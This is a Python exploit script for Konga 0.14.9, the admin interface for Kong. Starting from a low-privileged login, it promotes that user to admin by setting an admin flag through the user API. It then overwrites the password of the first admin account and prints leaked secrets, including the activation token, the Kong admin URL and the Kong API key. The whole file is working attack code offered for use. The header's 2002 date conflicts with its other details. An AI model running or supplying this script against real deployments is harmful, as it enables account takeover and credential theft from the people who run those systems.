#!/usr/bin/env python3
# -- coding: utf-8 -

# Exploit Title: KONGA 0.14.9 - Broken Acces Control
# Date: 24/08/2002
# Exploit Author: Claudemir Nunes / Maurício Santos (@RedTeamBrasil)
# Team Homepage: https://github.com/redteambrasil/BAC-Konga/
# Software Link: https://github.com/pantsel/konga/archive/refs/tags/0.14.9.zip
# Version: 0.14.9
# Tested on: Linux - Ubuntu 20.04.3 LTS (focal)

import argparse
import requests
import json
import sys
from time import sleep
import random
import string

# Colorschemes
NONE = '\033[00m'
RED = '\033[01;31m'
GREEN = '\033[01;32m'
YELLOW = '\033[01;33m'
BLUE = '\033[0;34m'
CYAN = '\033[01;36m'
BOLD = '\033[1m'

def parseArgs():
    parser = argparse.ArgumentParser(
        description=banner())
    parser.add_argument('--url', metavar='URL', required=True,type=str, help="Base URL(Including Port)")
    parser.add_argument('-u', metavar='Username', required=True,type=str, help="Username For Authentication")
    parser.add_argument('-p', metavar='Password', required=True,type=str, help="Password For Authentication")
    args = parser.parse_args()
    args.url = args.url if args.url[-1] == '/' else args.url + '/'
    return args

# Exploit Class
class Exploit:
	def __init__(self, userArgs):
		self.url = userArgs.url
		self.user = userArgs.u
		self.passwd = userArgs.p
		self.own = True
		self.token = ""
		self.id = 0
		self.headers = {
			"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", 
			"Content-Type": "application/json;charset=utf-8"
			}
		
		self.kongaLogin()
		self.PrivilegeEscalation()
		self.BrokenAccessControl()
		self.searhLeakedCredentials()

	def kongaLogin(self):
		self.data = {
			"identifier":self.user,
			"password":self.passwd }
		response = requests.post(self.url+"login", json=self.data)
		if(response.status_code == 200):
			json_object = json.loads(response.text)
			self.id = str(json_object['user']["id"])
			self.token = json_object["token"]
			print(f"{BLUE}[+]{NONE} User ID: " + str(json_object['user']["id"]))
			print(f"{BLUE}[+]{NONE} Username: " + json_object['user']["username"])
			sleep(0.5)
		else:
			print(f'{RED}[x]{NONE} User or pass invalid')
			sys.exit()


	def PrivilegeEscalation(self):
		print(f"{BLUE}[+]{NONE}{BOLD} Exploiting Privilege Escalation{NONE}")
		payload={
			"admin": "true",
			"passports": {
			"password": self.passwd,
			"protocol": "local"
			},
			"password_confirmation": self.passwd,
			"token":self.token
			}
		print(f"{BLUE}[+]{NONE} Change Normal User to Admin")
		exploitURL = self.url+"api/user/"+self.id
		exploited = requests.put(exploitURL, headers=self.headers, json=payload)
		exploitResult = json.loads(exploited.text)
		if (exploited.status_code == 200 and exploitResult['admin']):
			print(f"{GREEN}[+]{NONE} Success Privilege Escalation")
		else:
			print(f"{YELLOW}[+] Error{NONE}")
			sys.exit()

	def BrokenAccessControl(self):
		print(f'{CYAN}[+]{NONE}{BOLD} Exploiting Broken Access Control{NONE}')
		print(f"{BLUE}[+]{NONE} Finding users")
		self.headers['Authorization'] = 'Bearer '+self.token
		getAllUsers = requests.get(self.url+"api/user", headers=self.headers).text
		allUsers = json.loads(getAllUsers)
		print(f"{BLUE}[+]{NONE} {len(allUsers)} users found")
		print(f'{BOLD}ID\tAdmin\tUsername\t{NONE}')
		for uu in allUsers:
			if (uu["id"] == 1 and uu["admin"]):
				self.newPass = self.passGenerator()
				bacPayload = {
					"id":uu["id"],
					"passports":{
						"password": self.newPass,
						"protocol":"local"},
						"password_confirmation":self.newPass,
						"token": self.token
				}
				self.putNewPass = requests.put(self.url+"api/user/"+str(uu["id"]), headers=self.headers, json=bacPayload)
				print(f'{uu["id"]:3}\t{uu["admin"]}\t{uu["username"]:15}\t {GREEN}New passwd: {self.newPass}{NONE}')
			else:
				print(f'{uu["id"]:3}\t{uu["admin"]}\t{uu["username"]:15}\t')
		if (self.putNewPass.status_code == 200):
			print(f"{GREEN}[+]{NONE} Success Broken Access Control")
		else:
			print(f"{YELLOW}[+] Error{NONE}")
			sys.exit()

	def searhLeakedCredentials(self):
		print(f'{CYAN}[+]{NONE}{BOLD} Search Excessive data exposure (OWASP API3:2019){NONE}')
		leak = json.loads(self.putNewPass.text)
		if (leak["activationToken"]):
			print('-'*60)
			print(f'Konga activationToken: {leak["activationToken"]}')
		if (leak["node"]["name"]):
			print('-'*60)
			print(f'Kong connection name: {leak["node"]["name"]}')
			print(f'Kong admin URL: {leak["node"]["kong_admin_url"]}')
			print(f'Kong API Key: {leak["node"]["kong_api_key"]}')
			print('-'*60)

	def passGenerator(self, size=12, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
		return ''.join(random.choice(chars) for _ in range(size))

def banner():
	print('#'*60)
	print(f"{BOLD}\t\t\tKONGA 0.14.9")
	print(f"\t  Broken Access Control {RED}(@RedTeamBrasil){NONE}")
	print(f"{BOLD}\t\tPrivilege Escalation {BLUE}(@_SOl0m0n){NONE}")
	print('#'*60)

# Main Functions
def main():
	args = parseArgs()
	exploit = Exploit(args)

# Entry Point
if __name__ == '__main__':
    main()
